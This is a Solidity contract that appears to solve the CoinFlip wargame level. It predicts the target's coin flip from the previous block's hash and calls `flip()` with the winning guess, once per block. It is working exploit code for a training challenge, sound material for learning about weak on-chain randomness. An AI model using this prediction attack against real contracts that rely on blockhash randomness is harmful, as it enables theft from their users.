// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipSolver {
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    uint256 blockNumber;

    function guessFlip(address challenge) public {
        if (blockNumber == block.number) {
            revert("Wait for next block");
        }

        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        ICoinFlip instance = ICoinFlip(challenge);
        bool result = instance.flip(side);
        if (result == false) {
            revert("Flip failed");
        }

        blockNumber = block.number;
    }
}
